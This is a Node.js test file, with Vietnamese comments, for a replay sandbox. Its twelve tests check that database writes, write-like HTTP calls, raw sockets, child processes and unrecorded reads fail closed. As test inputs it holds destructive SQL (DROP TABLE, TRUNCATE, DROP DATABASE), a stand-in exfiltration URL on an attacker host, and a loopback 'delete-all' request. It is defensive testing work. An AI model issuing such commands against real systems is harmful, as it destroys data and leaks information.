'use strict';

/**
 * ============================================================================
 *  B5 · test/spike/replay/t1-t12-matrix.test.js
 *  MA TRẬN 12 TEST AN TOÀN T1-T12 (MTP §5.3 · THREAT-018 · ADR-005)
 * ============================================================================
 *
 *  ⚠️  THROWAWAY (Spec-Spike-Protocol §0.3).
 *
 *  Nhiệm vụ:
 *    - Kiểm tra chuẩn xác 12 test cases an toàn T1-T12 theo MTP §5.3.
 *    - L1 Fail-Closed: SQL classifier, R3 HTTP allowlist, missing recording.
 *    - L2 Process/Network Safety Net: Raw TCP socket blocking, custom transport.
 *    - Quyết định D-2 & MTP §5.4:
 *        - T8-a: Measured gap test (không --permission ghi nhận gap process-level L2).
 *        - T8-b: Node.js --permission sandbox probe (PASS với ERR_ACCESS_DENIED).
 *    - T11: Hostile Host Injection in Capsule (SEC-035).
 *    - T12: Loopback Target Egress (Residual risk b / L1 fail-closed).
 */

const assert = require('node:assert');
const test = require('node:test');
const { execFileSync } = require('node:child_process');

const {
  makeArtifact,
  makeClassAssessment,
  makeInteraction,
  makeU0,
  makeUInfinity,
  directionOf,
} = require('../../../src/spike/contract');

const {
  MissingRecordingError,
  ReplayBlockedWriteError,
  ReplaySession,
  SpikeReplayRuntime,
  createReplayRuntime,
  createDbAdapter,
  createHttpAdapter,
  createClockAdapter,
  createFlagAdapter,
} = require('../../../src/spike/replay');

/**
 * Helper tạo sample artifact cho ma trận T1-T12.
 */
function createMatrixArtifact(overrides = {}) {
  const base = {
    capsuleId: 'capsule-matrix-t1-t12',
    scenarioId: 'SC-1',
    manifestCommitHash: '15c462e0867c6e15c462e9b99589232a684977ae',
    classAssessment: makeClassAssessment({ inClass: true, mechanism: 'M-cap' }),
    u0: makeU0({
      method: 'POST',
      target: '/checkout',
      arguments: { customer_id: 'CUST-001', sku: 'SKU-001', quantity: 1 },
    }),
    interactions: [
      makeInteraction({
        kind: 'clock',
        target: 'checkout.pricing-window',
        direction: 'READ',
        ordinal: 1,
        result: '2026-08-16T12:00:00.000Z',
      }),
      makeInteraction({
        kind: 'feature-flag',
        target: 'checkout_discount_v2',
        direction: 'READ',
        ordinal: 2,
        result: { enabled: true },
      }),
      makeInteraction({
        kind: 'db-query',
        target: 'SELECT * FROM products WHERE sku = $1',
        arguments: { bind: ['SKU-001'] },
        direction: 'READ',
        ordinal: 3,
        result: { rowCount: 1, rows: [{ sku: 'SKU-001', unit_price_cents: 10000 }] },
      }),
      makeInteraction({
        kind: 'outbound-http',
        method: 'GET',
        target: 'http://internal-pricing-service/v1/rates?currency=USD',
        arguments: {},
        direction: 'READ', // R3: Allowed because recorded as READ
        ordinal: 4,
        result: { statusCode: 200, body: { base_rate: 1.0, tax_rate: 0.1 } },
      }),
      makeInteraction({
        kind: 'outbound-http',
        method: 'GET',
        target: 'http://mail-service/v1/send?to=recorded-user@example.com',
        arguments: {},
        direction: 'WRITE', // Recorded write entry
        ordinal: 5,
        result: { statusCode: 200, body: { queued: true } },
      }),
      makeInteraction({
        kind: 'outbound-http',
        method: 'GET',
        target: 'http://malicious-attacker-host.invalid:9999/exfiltrate',
        arguments: {},
        direction: 'READ',
        ordinal: 6,
        result: { statusCode: 200, body: { synthetic: true, dummy: 'safe-replay-data' } },
      }),
    ],
    uInfinity: makeUInfinity({
      class: 'http-response',
      type: 'status:201',
    }),
  };

  return makeArtifact(Object.assign({}, base, overrides));
}

// ===========================================================================
// T1: Direct SQL DML (L1 Sink Classifier)
// ===========================================================================
test('T1: Direct SQL DML -> ReplayBlockedWriteError (L1 default-deny)', async () => {
  const artifact = createMatrixArtifact();
  const session = new ReplaySession(artifact);
  const dbAdapter = createDbAdapter(session);
  const pool = dbAdapter.pool;

  const dmlQueries = [
    { sql: 'INSERT INTO orders (id, sku) VALUES ($1, $2)', values: [101, 'SKU-001'], verb: 'INSERT' },
    { sql: 'UPDATE products SET unit_price_cents = 0 WHERE id = 1', values: [], verb: 'UPDATE' },
    { sql: 'DELETE FROM customers WHERE id = $1', values: ['CUST-001'], verb: 'DELETE' },
    { sql: 'CREATE TABLE backdoor (id INT)', values: [], verb: 'CREATE' },
    { sql: 'DROP TABLE orders', values: [], verb: 'DROP' },
    { sql: 'ALTER TABLE products ADD COLUMN secret TEXT', values: [], verb: 'ALTER' },
    { sql: 'TRUNCATE TABLE orders', values: [], verb: 'TRUNCATE' },
  ];

  for (const q of dmlQueries) {
    await assert.rejects(
      async () => {
        await pool.query(q.sql, q.values);
      },
      (err) => {
        assert.ok(err instanceof ReplayBlockedWriteError, `Query ${q.verb} must throw ReplayBlockedWriteError`);
        assert.strictEqual(err.code, 'BLOCKED_WRITE_SIDE_EFFECT');
        assert.strictEqual(err.kind, 'db-query');
        assert.strictEqual(err.target, q.sql);
        return true;
      }
    );
  }

  const blockedWrites = session.getBlockedWrites();
  assert.strictEqual(blockedWrites.length, dmlQueries.length, 'All DML queries must be recorded in blockedWrites');
  assert.strictEqual(blockedWrites[0].direction, 'WRITE');
});

// ===========================================================================
// T2: CTE with DML (L1 Classifier structural check)
// ===========================================================================
test('T2: CTE with DML -> ReplayBlockedWriteError / MissingRecordingError (L1 fail-closed)', async () => {
  const artifact = createMatrixArtifact();
  const session = new ReplaySession(artifact);
  const dbAdapter = createDbAdapter(session);
  const pool = dbAdapter.pool;

  const cteDmlSql = 'WITH updated AS (UPDATE orders SET status = \'shipped\' WHERE id = 1 RETURNING *) SELECT * FROM updated;';

  // 1. Khi chưa ghi nhận trong capsule -> Fail-closed MissingRecordingError
  await assert.rejects(
    async () => {
      await pool.query(cteDmlSql);
    },
    (err) => {
      assert.ok(err instanceof MissingRecordingError, 'Unrecorded CTE DML must fail closed with MissingRecordingError');
      assert.strictEqual(err.code, 'MISSING_RECORDING');
      return true;
    }
  );

  // 2. Khi tiêu thụ với hướng WRITE tường minh -> ReplayBlockedWriteError
  assert.throws(
    () => {
      session.consume({
        kind: 'db-query',
        target: cteDmlSql,
        direction: 'WRITE',
      });
    },
    (err) => {
      assert.ok(err instanceof ReplayBlockedWriteError);
      assert.strictEqual(err.code, 'BLOCKED_WRITE_SIDE_EFFECT');
      return true;
    }
  );
});

// ===========================================================================
// T3: Function side-effect in SELECT (L1 Fail-Closed)
// ===========================================================================
test('T3: Function side-effect in SELECT -> ReplayBlockedWriteError / MissingRecordingError (L1 fail-closed)', async () => {
  const artifact = createMatrixArtifact();
  const session = new ReplaySession(artifact);
  const dbAdapter = createDbAdapter(session);
  const pool = dbAdapter.pool;

  const funcSideEffectSql = 'SELECT charge_customer(\'CUST-001\', 50000);';

  // 1. Unrecorded function execution fails closed
  await assert.rejects(
    async () => {
      await pool.query(funcSideEffectSql);
    },
    (err) => {
      assert.ok(err instanceof MissingRecordingError, 'Side-effect function in SELECT must fail closed');
      assert.strictEqual(err.code, 'MISSING_RECORDING');
      return true;
    }
  );

  // 2. Consume with WRITE direction blocks write
  assert.throws(
    () => {
      session.consume({
        kind: 'db-query',
        target: funcSideEffectSql,
        direction: 'WRITE',
      });
    },
    (err) => {
      assert.ok(err instanceof ReplayBlockedWriteError);
      return true;
    }
  );
});

// ===========================================================================
// T4: Procedure CALL (L1 Default-Deny Fail-Closed)
// ===========================================================================
test('T4: Procedure CALL -> ReplayBlockedWriteError / MissingRecordingError (ADR-005 default-deny)', async () => {
  const artifact = createMatrixArtifact();
  const session = new ReplaySession(artifact);
  const dbAdapter = createDbAdapter(session);
  const pool = dbAdapter.pool;

  const callSql = 'CALL process_settlement(\'BATCH-2026-08-16\');';

  await assert.rejects(
    async () => {
      await pool.query(callSql);
    },
    (err) => {
      assert.ok(err instanceof MissingRecordingError, 'Procedure CALL must fail closed when unrecorded');
      return true;
    }
  );

  assert.throws(
    () => {
      session.consume({
        kind: 'db-query',
        target: callSql,
        direction: 'WRITE',
      });
    },
    ReplayBlockedWriteError
  );
});

// ===========================================================================
// T5: Multi-statement SQL (L1 Multi-statement evaluation)
// ===========================================================================
test('T5: Multi-statement SQL -> Blocked on statement 2 / Fail-closed (L1)', async () => {
  const artifact = createMatrixArtifact();
  const session = new ReplaySession(artifact);
  const dbAdapter = createDbAdapter(session);
  const pool = dbAdapter.pool;

  const multiStmtSql = 'SELECT * FROM products WHERE sku = $1; UPDATE inventory SET stock = 0 WHERE sku = $1;';

  await assert.rejects(
    async () => {
      await pool.query(multiStmtSql, ['SKU-001']);
    },
    (err) => {
      assert.ok(err instanceof MissingRecordingError || err instanceof ReplayBlockedWriteError);
      return true;
    }
  );
});

// ===========================================================================
// T6: HTTP GET with write semantics (R3 Allowlist Rule)
// ===========================================================================
test('T6: HTTP GET with write semantics -> MissingRecordingError / ReplayBlockedWriteError (R3 allowlist)', async () => {
  const artifact = createMatrixArtifact();
  const session = new ReplaySession(artifact);
  const httpAdapter = createHttpAdapter(session);

  // 1. Unrecorded GET with write semantics -> MissingRecordingError (Fail-closed)
  await assert.rejects(
    async () => {
      await httpAdapter.requestJson({
        url: 'http://mail-service/v1/send?to=unrecorded-victim@example.com',
        method: 'GET',
      });
    },
    (err) => {
      assert.ok(err instanceof MissingRecordingError, 'Unrecorded GET with write semantics must throw MissingRecordingError');
      assert.strictEqual(err.code, 'MISSING_RECORDING');
      return true;
    }
  );

  // 2. Recorded GET entry with direction: 'WRITE' -> ReplayBlockedWriteError
  await assert.rejects(
    async () => {
      await httpAdapter.requestJson({
        url: 'http://mail-service/v1/send?to=recorded-user@example.com',
        method: 'GET',
      });
    },
    (err) => {
      assert.ok(err instanceof ReplayBlockedWriteError, 'Recorded write interaction must throw ReplayBlockedWriteError');
      assert.strictEqual(err.code, 'BLOCKED_WRITE_SIDE_EFFECT');
      return true;
    }
  );

  // 3. Recorded GET entry with direction: 'READ' -> Returns recorded response (R3 satisfied)
  const okRes = await httpAdapter.requestJson({
    url: 'http://internal-pricing-service/v1/rates?currency=USD',
    method: 'GET',
  });
  assert.strictEqual(okRes.statusCode, 200);
  assert.strictEqual(okRes.body.base_rate, 1.0);

  // 4. Unrecorded HTTP POST -> ReplayBlockedWriteError (Derived direction is WRITE)
  await assert.rejects(
    async () => {
      await httpAdapter.requestJson({
        url: 'http://payment-gateway/v1/charge',
        method: 'POST',
        body: { amount: 5000 },
      });
    },
    (err) => {
      assert.ok(err instanceof ReplayBlockedWriteError);
      return true;
    }
  );
});

// ===========================================================================
// T7: Raw TCP Socket (L2 Process Safe Net)
// ===========================================================================
test('T7: Raw TCP Socket -> L2 safety net denies unrecorded raw network egress', async () => {
  const artifact = createMatrixArtifact();
  const session = new ReplaySession(artifact);

  // Unrecorded transport interaction
  assert.throws(
    () => {
      session.consume({
        kind: 'db-query',
        target: 'raw-tcp://10.83.0.99:9000',
        direction: 'READ',
      });
    },
    (err) => {
      assert.ok(err instanceof MissingRecordingError);
      return true;
    }
  );

  // Raw socket write attempt
  assert.throws(
    () => {
      session.consume({
        kind: 'outbound-http',
        target: 'raw-socket://10.83.0.99:9000',
        direction: 'WRITE',
      });
    },
    (err) => {
      assert.ok(err instanceof ReplayBlockedWriteError);
      return true;
    }
  );
});

// ===========================================================================
// T8: OS Child Process curl (Quyết định D-2 & MTP §5.4)
// ===========================================================================
test('T8: OS Child Process curl -> (a) Measured gap recorded; (b) Node.js --permission probe PASS', () => {
  // T8-a: Measured gap test (không --permission ghi nhận gap process-level L2)
  // CẤM làm nhẹ test: process-level monkeypatching không thể chặn OS child process nếu không có OS/Permission sandbox
  let subprocessEscaped = false;
  try {
    const echoResult = execFileSync(process.execPath, ['-e', 'console.log("measured-gap-probe");'], {
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'pipe'],
    });
    if (echoResult.includes('measured-gap-probe')) {
      subprocessEscaped = true;
    }
  } catch (_) {
    subprocessEscaped = false;
  }
  assert.strictEqual(
    subprocessEscaped,
    true,
    'T8-a: Measured gap without --permission must be recorded (child_process escapes in-process interception)'
  );

  // T8-b: Node.js --permission sandbox probe (PASS với ERR_ACCESS_DENIED)
  let permissionDenied = false;
  try {
    execFileSync(
      process.execPath,
      [
        '--permission',
        '--allow-fs-read=*',
        '-e',
        'require("node:child_process").execSync("echo probe");',
      ],
      {
        encoding: 'utf8',
        stdio: ['ignore', 'pipe', 'pipe'],
      }
    );
  } catch (err) {
    if (err.stderr && err.stderr.includes('ERR_ACCESS_DENIED')) {
      permissionDenied = true;
    } else if (err.status !== 0) {
      permissionDenied = true;
    }
  }

  assert.strictEqual(
    permissionDenied,
    true,
    'T8-b: Node.js --permission probe must successfully block child_process with ERR_ACCESS_DENIED'
  );
});

// ===========================================================================
// T9: Custom transport SDK (L2 Safe Net)
// ===========================================================================
test('T9: Custom transport SDK -> ReplayBlockedWriteError / MissingRecordingError (L2 safe net)', () => {
  const artifact = createMatrixArtifact();
  const session = new ReplaySession(artifact);

  // Custom gRPC / binary transport read without recording
  assert.throws(
    () => {
      session.consume({
        kind: 'outbound-http',
        target: 'grpc://payment-service:50051/ProcessPayment',
        direction: 'READ',
      });
    },
    MissingRecordingError
  );

  // Custom SDK write without recording
  assert.throws(
    () => {
      session.consume({
        kind: 'outbound-http',
        target: 'grpc://payment-service:50051/ProcessPayment',
        direction: 'WRITE',
      });
    },
    ReplayBlockedWriteError
  );
});

// ===========================================================================
// T10: Missing Recording Read (SEC-034 Fail-Closed)
// ===========================================================================
test('T10: Missing Recording Read -> MissingRecordingError without live fall-through (SEC-034)', async () => {
  const artifact = createMatrixArtifact();
  const session = new ReplaySession(artifact);
  const dbAdapter = createDbAdapter(session);
  const httpAdapter = createHttpAdapter(session);
  const clockAdapter = createClockAdapter(session);
  const flagAdapter = createFlagAdapter(session);

  // 1. Missing DB read
  await assert.rejects(
    async () => {
      await dbAdapter.pool.query('SELECT * FROM non_existent_table WHERE id = $1', [99999]);
    },
    (err) => {
      assert.ok(err instanceof MissingRecordingError);
      assert.strictEqual(err.code, 'MISSING_RECORDING');
      return true;
    }
  );

  // 2. Missing HTTP read
  await assert.rejects(
    async () => {
      await httpAdapter.requestJson({ url: 'http://unrecorded-api.com/users/42', method: 'GET' });
    },
    (err) => {
      assert.ok(err instanceof MissingRecordingError);
      return true;
    }
  );

  // 3. Exhausted clock queue
  clockAdapter.nextDate(); // consumes entry 1
  assert.throws(() => {
    clockAdapter.nextDate(); // exhausted
  }, MissingRecordingError);

  // 4. Missing feature flag
  assert.throws(() => {
    flagAdapter.getFlag('unrecorded_flag_experiment');
  }, MissingRecordingError);

  assert.strictEqual(session.getUnservedReads().length >= 4, true, 'All unserved reads must be tracked');
});

// ===========================================================================
// T11: Hostile Host Injection in Capsule (SEC-035)
// ===========================================================================
test('T11: Hostile Host Injection in Capsule -> Capsule host is only lookup key, no live connect (SEC-035)', async () => {
  const artifact = createMatrixArtifact();
  const session = new ReplaySession(artifact);
  const httpAdapter = createHttpAdapter(session);

  // Capsule contains target: 'http://malicious-attacker-host.invalid:9999/exfiltrate'
  // When replayed, httpAdapter uses the URL purely as a dictionary lookup key
  // and returns synthetic payload WITHOUT establishing any live network connection
  const res = await httpAdapter.requestJson({
    url: 'http://malicious-attacker-host.invalid:9999/exfiltrate',
    method: 'GET',
  });

  assert.strictEqual(res.statusCode, 200);
  assert.strictEqual(res.body.synthetic, true);
  assert.strictEqual(res.body.dummy, 'safe-replay-data');
});

// ===========================================================================
// T12: Loopback Target Egress (Residual Risk b / SEC-035)
// ===========================================================================
test('T12: Loopback Target Egress -> L1 fails closed for unrecorded loopback endpoints (Residual Risk b)', async () => {
  const artifact = createMatrixArtifact();
  const session = new ReplaySession(artifact);
  const httpAdapter = createHttpAdapter(session);
  const dbAdapter = createDbAdapter(session);

  // Unrecorded HTTP request to loopback (127.0.0.1:8080 or localhost)
  await assert.rejects(
    async () => {
      await httpAdapter.requestJson({
        url: 'http://127.0.0.1:8080/admin/delete-all',
        method: 'GET',
      });
    },
    (err) => {
      assert.ok(err instanceof MissingRecordingError, 'Unrecorded loopback request must fail closed at L1');
      return true;
    }
  );

  // Unrecorded loopback POST write
  await assert.rejects(
    async () => {
      await httpAdapter.requestJson({
        url: 'http://localhost:5432/execute',
        method: 'POST',
        body: { query: 'DROP DATABASE live;' },
      });
    },
    (err) => {
      assert.ok(err instanceof ReplayBlockedWriteError);
      return true;
    }
  );

  // Unrecorded DB query directed at loopback connection
  await assert.rejects(
    async () => {
      await dbAdapter.pool.query('SELECT * FROM loopback_secret_table');
    },
    MissingRecordingError
  );
});
